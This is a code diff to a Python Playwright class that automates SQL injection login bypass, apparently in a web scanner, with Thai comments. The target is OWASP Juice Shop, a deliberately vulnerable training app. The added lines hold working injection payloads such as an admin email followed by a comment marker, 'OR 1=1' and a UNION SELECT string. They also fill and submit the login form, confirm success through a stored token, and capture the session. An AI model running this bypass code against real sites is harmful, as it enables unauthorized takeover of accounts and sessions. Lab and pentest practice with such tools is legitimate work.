@@ -74,25 +74,40 @@ class AuthHandler:
         return False
 
     async def _try_sqli_bypass(self, page: Page) -> bool:
-        payloads = ["' OR 1=1 --", "' OR '1'='1", '" OR 1=1 --']
-        user_input = page.locator('input[type="text"], input[type="email"]').first
+        # Payload เหล่านี้ออกแบบมาเพื่อตัดส่วนตรวจสอบ Password ของ SQLite ออก
+        payloads = [
+            "admin@juice-sh.op'--",         # 👈 ตัวนี้คือตัวเด็ดสำหรับ Juice Shop
+            "' OR 1=1 --", 
+            "admin@juice-sh.op' OR 1=1 --",
+            "' UNION SELECT NULL, 'admin@juice-sh.op', 'password', 'admin' --"
+        ]
+        
+        user_input = page.locator('input[type="text"], input[type="email"], [name*="email"]').first
         pass_input = page.locator('input[type="password"]').first
-        submit_btn = page.locator('button[type="submit"], input[type="submit"]').first
+        # ปุ่ม Login ของ Juice Shop มักจะเป็นปุ่ม id="loginButton"
+        submit_btn = page.locator('#loginButton, button[type="submit"], button:has-text("Log in")').first
 
         for payload in payloads:
             try:
+                # สำคัญ: ต้องปิด Welcome Banner ก่อน (ถ้ามี)
+                await self._dismiss_initial_modals(page)
+                
                 await page.reload(wait_until="networkidle") 
-                self.logger.info(f"[Auth] Testing SQLi Bypass: {payload}")
+                self.logger.info(f"[Auth] Testing SQLi Bypass Payload: {payload}")
+                
                 await user_input.fill(payload)
-                await pass_input.fill("anything")
+                await pass_input.fill("anything") # ใส่ค่าอะไรก็ได้
                 
                 await submit_btn.click()
-                await page.wait_for_load_state("networkidle")
+                # รอให้ระบบจัดการ Redirect หลัง Login
+                await page.wait_for_load_state("networkidle", timeout=5000)
 
                 if await self._check_success(page):
                     await self._capture_session(page)
+                    self.logger.info(f"[Auth] ✅ SQLi Bypass SUCCESS with: {payload}")
                     return True
-            except: continue
+            except: 
+                continue
         return False
 
     async def _capture_session(self, page: Page):
@@ -110,11 +125,16 @@ class AuthHandler:
         return False
 
     async def _check_success(self, page: Page) -> bool:
-        indicators = ["logout", "sign out", "dashboard", "settings", "profile"]
-        content = (await page.content()).lower()
-        has_indicator = any(ind in content for ind in indicators)
-        is_not_login_url = "login" not in page.url.lower()
-        return has_indicator and is_not_login_url
+        # 1. เช็คจาก LocalStorage ว่ามี token หรือไม่
+        has_token = await page.evaluate("() => localStorage.getItem('token') !== null")
+        
+        # 2. เช็คว่ามีปุ่มที่แสดงเฉพาะตอน Login แล้วหรือไม่ (เช่น ตะกร้าสินค้า)
+        basket_visible = await page.locator('button[aria-label="Show the shopping basket"]').is_visible()
+        
+        # 3. เช็คว่าไม่มีคำว่า "Invalid email or password" โผล่มา
+        error_msg = await page.locator(".error").is_visible()
+        
+        return (has_token or basket_visible) and not error_msg
 
     async def _try_default_creds(self, page: Page) -> bool:
         self.logger.info("[Auth] 🔑 Testing default credentials...")
@@ -139,3 +159,18 @@ class AuthHandler:
                     await page.go_back()
             except: continue
         return False
+    
+    async def _dismiss_initial_modals(self, page: Page):
+        """กดปิดปุ่ม Dismiss และปุ่มคุ้มครองข้อมูลส่วนบุคคล"""
+        try:
+            # กดปุ่ม "Dismiss" ของ Welcome Banner
+            dismiss_btn = page.locator('button[aria-label="Close Welcome Banner"]')
+            if await dismiss_btn.is_visible():
+                await dismiss_btn.click()
+                
+            # กดปุ่ม "Me want it!" ของ Cookie Message
+            cookie_btn = page.locator('a[aria-label="dismiss cookie message"]')
+            if await cookie_btn.is_visible():
+                await cookie_btn.click()
+        except:
+            pass
